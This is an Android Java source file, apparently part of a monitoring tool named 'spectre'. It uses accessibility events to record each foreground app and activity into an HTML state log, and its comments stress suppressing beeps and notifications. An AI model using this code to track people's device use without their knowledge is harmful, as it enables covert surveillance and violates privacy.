package com.hygnus.spectre;

import android.content.ComponentName;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

public class ActivityDriver {
    private static String applicationLabel = "";
    private static String lastActivity = "";

    public static void captureActivity(AccessibilityEvent event) {
        CharSequence packageName = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
            packageName = event.getPackageName();
        }
        CharSequence className = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
            className = event.getClassName();
        }

        if (packageName != null && className != null) {
            try {
                ComponentName componentName = new ComponentName(packageName.toString(), className.toString());
                ActivityInfo activityInfo = Kernel.serviceContext.getPackageManager().getActivityInfo(componentName, 0);

                if (!componentName.flattenToShortString().equals(lastActivity)) {
                    lastActivity = componentName.flattenToShortString();

                    try {
                        applicationLabel = activityInfo.loadLabel(Kernel.serviceContext.getPackageManager()).toString();
                    } catch (Exception e) {
                        Kernel.handleException(e, false, false); // No beep, no notification
                    }

                    Storage.logMessage(Storage.stateWriter, "<span style=\"color:hotpink\"><strong>" +
                            applicationLabel + "</strong> [" + componentName.getClassName() + "]</span>", true);

                }
            } catch (PackageManager.NameNotFoundException e) {
                Kernel.handleException(e, false, false); // No beep, no notification
            }
        }
    }
}